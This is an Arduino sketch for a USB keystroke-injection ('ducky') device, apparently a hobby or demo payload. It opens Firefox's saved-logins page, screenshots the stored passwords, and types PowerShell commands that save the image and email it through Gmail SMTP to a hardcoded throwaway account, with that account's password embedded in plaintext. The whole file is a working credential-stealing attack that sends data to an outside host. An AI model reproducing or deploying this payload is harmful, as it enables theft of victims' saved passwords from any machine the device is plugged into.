#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  startBuffer(); //Buffer to unplug or upload
  desktopStart();
  ducky();
}

// This is a 10 second count down timer which delay the execution of the file
// Allows time to upload a new script or stop a script to the system
// Do NOT edit
void startBuffer() {
  for (int x = 0; x < 10; x++) {
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
  }
}

//Here is where the payload program will exist
void ducky() {
  
  //Open firefox
  int runKeys[2] = {KEY_LEFT_GUI,114};
  simulType(runKeys);
  delay(500);
  Keyboard.print("firefox");
  delay(500);
  typeKey(KEY_RETURN);
  delay(8000); //Give chance for firefox to load

  delay(500);
  //Traverse to saved login
  int searchBarKeys[2] = {KEY_LEFT_CTRL,108};
  simulType(searchBarKeys);
  Keyboard.print("about:logins"); //about:preferences#privacy
  delay(500);
  typeKey(KEY_RETURN);
  
  //Save screenshot to desktop
  //**10 Tabs and a space is how you can change the password to unhidden, Trivial implementation and security risk on my behalf**
  delay(3000); //Give time for passwords to load
  typeKey(206);
  delay(500);
  
  //Save screenshot to location (desktop)
  simulType(runKeys);
  delay(500);
  Keyboard.print("powershell");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);
  
  Keyboard.print("$screenshot = gcb -Format Image");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);
  
  Keyboard.print("$path = 'C:\\Users\\Public\\password.png'");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("$screenshot.Save($path,'png')");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);

  //Email photo with smtp
  Keyboard.print("$EmailTo = \"hao.throwaway.1@gmail.com\"");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);
  
  Keyboard.print("$EmailFrom = \"hao.throwaway.1@gmail.com\"");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("$Subject = \"Passwords\"");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("$SMTPServer = \"smtp.gmail.com\"");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("$filenameAndPath = \"C:\\Users\\Public\\password.png\"");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("$SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom,$EmailTo,$Subject,$Body)");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);
  
  Keyboard.print("$attachment = New-Object System.Net.Mail.Attachment($filenameAndPath)");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("$SMTPMessage.Attachments.Add($attachment)");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("$SMTPClient.EnableSsl = $true");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("$SMTPClient.Credentials = New-Object System.Net.NetworkCredential('hao.throwaway.1@gmail.com','throwAway123')");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("$SMTPClient.Send($SMTPMessage)");
  delay(500);
  typeKey(KEY_RETURN);
  delay(500);
}

//Type and release a chosen key
void typeKey(int key)
{
  Keyboard.press(key);
  delay(100);
  Keyboard.release(key);
}

//Deals with multiple key presses, will press multiple keys together
//Ex. int keysToSimulPress[3] = {KEY_LEFT_CTRL,KEY_LEFT_ALT,KEY_DELETE};
void simulType(int keys[]) {
  int numOfKeys = sizeof(keys);
  for (int i = 0; i <= numOfKeys; i++) {
    //Serial.print(keys[i]);
    
    Keyboard.press(keys[i]);
    delay(10);
  }
  Keyboard.releaseAll();
}

//Forces a users system to look at the desktop
//Minimizes all the windows
void desktopStart() {
  delay(100);
  int dStartKeys[2] = {KEY_LEFT_GUI,109};
  simulType(dStartKeys);
  delay(100);
}

//Signifier that the payload has completed execution
void endBlink() {
  digitalWrite(LED_BUILTIN, HIGH);
  delay(1000);
  digitalWrite(LED_BUILTIN, LOW);
  delay(1000);
}

void loop() {
  endBlink();
}
